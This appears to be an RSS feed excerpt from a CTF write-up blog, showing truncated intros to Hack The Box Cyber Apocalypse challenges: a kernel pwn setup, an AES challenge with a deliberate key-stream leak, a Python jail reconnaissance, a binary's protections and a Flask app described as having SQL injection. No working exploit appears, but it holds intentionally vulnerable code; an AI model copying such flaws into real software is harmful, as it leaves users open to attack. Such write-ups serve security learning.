&lt;p>The binary is already prepared to use the remote library and loader, so there&amp;rsquo;s nothing more left to do.&lt;/p></description></item><item><title>Maze of Mist</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/maze-of-mist/</guid><description>&lt;p>We are given a compressed &lt;code>vmlinuz-linux&lt;/code> kernel image, an &lt;code>initramfs.cpio.gz&lt;/code> filesystem and a &lt;code>run.sh&lt;/code> script:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">unzip&lt;/span> -l &lt;span class="mtku">pwn_maze_of_mist.zip&lt;/span>
Archive: pwn_maze_of_mist.zip
 Length Date Time Name
--------- ---------- ----- ----
 0 2024-02-06 09:30 maze_of_mist/
 1347202 2024-02-06 09:29 maze_of_mist/initramfs.cpio.gz 
 291 2024-02-06 09:26 maze_of_mist/run.sh
 12886816 2024-02-06 09:26 maze_of_mist/vmlinuz-linux
--------- -------
 14234309 4 files

&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">unzip&lt;/span> &lt;span class="mtku">pwn_maze_of_mist.zip&lt;/span>
Archive: pwn_maze_of_mist.zip
 creating: maze_of_mist/
 inflating: maze_of_mist/initramfs.cpio.gz
 inflating: maze_of_mist/run.sh
 inflating: maze_of_mist/vmlinuz-linux
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>If we decompress the filesystem, we find a 32-bit binary called &lt;code>target&lt;/code>:&lt;/p></description></item><item><title>Multipage Recyclings</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/multipage-recyclings/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/multipage-recyclings/</guid><description>&lt;p>We are provided with the server source code in Python:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">Crypto&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Util&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">Padding&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pad&lt;/span>
&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">random&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>

&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">'HTB{??????????????????????}'&lt;/span>


&lt;span class="mtk7 mtki">class&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">CAES&lt;/span>&lt;span class="mtk1">:&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7">__init__&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">urandom&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">new&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">key&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8 mtku">AES&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">MODE_ECB&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">blockify&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">message&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">size&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk9 mtki">message&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1">:&lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">size&lt;/span>&lt;span class="mtk1">] &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">range&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">len&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">message&lt;/span>&lt;span class="mtk1">), &lt;/span>&lt;span class="mtk9 mtki">size&lt;/span>&lt;span class="mtk1">)]&lt;/span> 

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">xor&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">b&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">''&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">join&lt;/span>&lt;span class="mtk1">([&lt;/span>&lt;span class="mtk8 mtku">bytes&lt;/span>&lt;span class="mtk1">([&lt;/span>&lt;span class="mtk1">_a&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">^&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">_b&lt;/span>&lt;span class="mtk1">]) &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">_a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">_b&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">zip&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">a&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">b&lt;/span>&lt;span class="mtk1">)])&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">message&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">iv&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">os&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">urandom&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">b&lt;/span>&lt;span class="mtk4">''&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">plaintext&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">iv&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">blocks&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">blockify&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">message&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">block&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">blocks&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">plaintext&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">encrypted_block&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">xor&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">block&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">ct&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">encrypted_block&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">plaintext&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">encrypted_block&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">leak&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">blocks&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">random&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">randint&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">len&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">blocks&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">-&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">2&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">leak&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk9 mtki">self&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk1">cipher&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">blocks&lt;/span>&lt;span class="mtk1">[&lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1">]).&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">() &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">i&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">+&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">1&lt;/span>&lt;span class="mtk1">]]&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">return&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">leak&lt;/span>


&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">():&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">aes&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">CAES&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">message&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">pad&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">FLAG&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">*&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk6">4&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">aes&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">encrypt&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">message&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">ciphertext_blocks&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">aes&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">blockify&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk6">16&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">leak&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">aes&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">leak&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">ciphertext_blocks&lt;/span>&lt;span class="mtk1">)&lt;/span>

&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">with&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">open&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk4">'output.txt'&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk4">'w'&lt;/span>&lt;span class="mtk1">) &lt;/span>&lt;span class="mtk5">as&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">f&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">f&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">write&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk7 mtki">f&lt;/span>&lt;span class="mtk4">'ct = &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">ciphertext&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8">hex&lt;/span>&lt;span class="mtk1">()&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">r = &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">r&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">phrases = &lt;/span>&lt;span class="mtk6">{&lt;/span>&lt;span class="mtk1">leak&lt;/span>&lt;span class="mtk6">}\n&lt;/span>&lt;span class="mtk4">'&lt;/span>&lt;span class="mtk1">)&lt;/span>


&lt;span class="mtk5">if&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">__name__&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">==&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk4">"__main__"&lt;/span>&lt;span class="mtk1">:&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">main&lt;/span>&lt;span class="mtk1">()&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>And we also have the output of the script in &lt;code>output.txt&lt;/code>:&lt;/p></description></item><item><title>nehebkaus trap</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/nehebkaus-trap/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/nehebkaus-trap/</guid><description>&lt;p>We are given a remote instance to connect to:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">nc&lt;/span> 167.71.143.44 32139 
&lt;span class="code-red"> __&lt;/span>
&lt;span class="code-red"> {00}&lt;/span>
&lt;span class="code-red"> \__/&lt;/span>
&lt;span class="code-red"> /^/&lt;/span>
&lt;span class="code-red"> ( (&lt;/span>
&lt;span class="code-red"> \_\_____&lt;/span>
&lt;span class="code-red"> (_______)&lt;/span>
&lt;span class="code-red"> (_________()Ooo.&lt;/span>

&lt;span class="code-blue">[ Nehebkau's Trap ]&lt;/span>

&lt;span class="code-white">You are trapped!&lt;/span>
&lt;span class="code-white">Can you escape?&lt;/span>
&lt;span class="code-white">&amp;gt;&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="basic-reconnaissance">Basic reconnaissance&lt;/h2>
&lt;p>We are allowed to enter some information, but it shows an error:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-white">&amp;gt; asdf&lt;/span>

&lt;span class="code-white">[*] Input accepted!&lt;/span>

&lt;span class="code-white">Error: name 'asdf' is not defined&lt;/span> 
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>The error message looks familiar to a Python REPL:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="code-cyan">$&lt;/span> &lt;span class="code-dark-green">python3&lt;/span> -q
&amp;gt;&amp;gt;&amp;gt; asdf
Traceback (most recent call last):
 File "&amp;lt;stdin&amp;gt;", line 1, in &amp;lt;module&amp;gt; 
NameError: name 'asdf' is not defined
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>Plus, the banner shows a snake, so probably this is a Python jail challenge. We will need to escape and read the flag. For that, let&amp;rsquo;s try to use the most basic payload:&lt;/p></description></item><item><title>Oracle</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/oracle/</guid><description>&lt;p>We are given a 64-bit binary called &lt;code>oracle&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">Arch: amd64-64-little 
RELRO: &lt;span class="code-dark-yellow">Partial RELRO&lt;/span>
Stack: &lt;span class="code-dark-ref">No canary found&lt;/span>
NX: &lt;span class="code-dark-green">NX enabled&lt;/span>
PIE: &lt;span class="code-dark-green">PIE enabled&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;p>We also have a &lt;code>Dockerfile&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">FROM&lt;/span>&lt;span class="mtk1"> ubuntu:20.04&lt;/span>

&lt;span class="mtk5">RUN&lt;/span>&lt;span class="mtk1"> useradd -m ctf&lt;/span>

&lt;span class="mtk5">COPY&lt;/span>&lt;span class="mtk1"> challenge/* /home/ctf/&lt;/span>

&lt;span class="mtk5">RUN&lt;/span>&lt;span class="mtk1"> chown -R ctf:ctf /home/ctf/&lt;/span> 

&lt;span class="mtk5">WORKDIR&lt;/span>&lt;span class="mtk1"> /home/ctf&lt;/span>
&lt;span class="mtk5">USER&lt;/span>&lt;span class="mtk1"> ctf&lt;/span>

&lt;span class="mtk5">EXPOSE&lt;/span>&lt;span class="mtk1"> 9001&lt;/span>
&lt;span class="mtk5">CMD&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk4">"./run.sh"&lt;/span>&lt;span class="mtk1">]&lt;/span>
&lt;/code>&lt;/pre>&lt;/div>

&lt;h2 id="source-code-analysis">Source code analysis&lt;/h2>
&lt;p>This time, we are given the source code of the program in C. It is quite large, so I will only put the relevant parts.&lt;/p>
&lt;p>The &lt;code>main&lt;/code> function shows that the program is a server that accepts connections from clients:&lt;/p></description></item><item><title>Orbital</title><link>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/orbital/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://7rocky.github.io/en/ctf/other/htb-cyber-apocalypse/orbital/</guid><description>&lt;p>We are given a website like this:&lt;/p>
&lt;p>&lt;img alt="Orbital 1" src="https://7rocky.github.io/images/other/HTB%20Cyber%20Apocalypse%202023/Orbital-1.webp">&lt;/p>
&lt;p>We also have the source code in Python.&lt;/p>
&lt;h2 id="source-code-analysis">Source code analysis&lt;/h2>
&lt;p>The web application is built with Flask. A clear SQL injection (SQLi) vulnerability can be found at &lt;code>database.py&lt;/code>:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2">&lt;code class="no-highlight">&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">colorama&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">Cursor&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">application&lt;/span>&lt;span class="mtk1">.&lt;/span>&lt;span class="mtk8 mtku">util&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">createJWT&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk8">passwordVerify&lt;/span>
&lt;span class="mtk5">from&lt;/span>&lt;span class="mtk1"> flask_mysqldb &lt;/span>&lt;span class="mtk5">import&lt;/span>&lt;span class="mtk1"> MySQL&lt;/span>

&lt;span class="mtk1">mysql&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> MySQL()&lt;/span>

&lt;span class="mtk7 mtki">def&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8">query&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk9 mtki">query&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">args&lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1">(), &lt;/span>&lt;span class="mtk9 mtki">one&lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk6">False&lt;/span>&lt;span class="mtk1">):&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cursor&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">mysql&lt;/span>&lt;span class="mtk1">.connection.cursor()&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cursor&lt;/span>&lt;span class="mtk1">.execute(&lt;/span>&lt;span class="mtk9 mtki">query&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk9 mtki">args&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">rv&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">=&lt;/span>&lt;span class="mtk1"> [&lt;/span>&lt;span class="mtk8 mtku">dict&lt;/span>&lt;span class="mtk1">((&lt;/span>&lt;span class="mtk1">cursor&lt;/span>&lt;span class="mtk1">.description[&lt;/span>&lt;span class="mtk1">idx&lt;/span>&lt;span class="mtk1">][&lt;/span>&lt;span class="mtk6">0&lt;/span>&lt;span class="mtk1">], &lt;/span>&lt;span class="mtk1">value&lt;/span>&lt;span class="mtk1">)&lt;/span>
&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">idx&lt;/span>&lt;span class="mtk1">, &lt;/span>&lt;span class="mtk1">value&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk8 mtku">enumerate&lt;/span>&lt;span class="mtk1">(&lt;/span>&lt;span class="mtk1">row&lt;/span>&lt;span class="mtk1">)) &lt;/span>&lt;span class="mtk5">for&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">row&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk5">in&lt;/span>&lt;span class="mtk1"> &lt;/span>&lt;span class="mtk1">cursor&lt;/span>&lt;span class="mtk1">.fetchall()]&lt;/span>
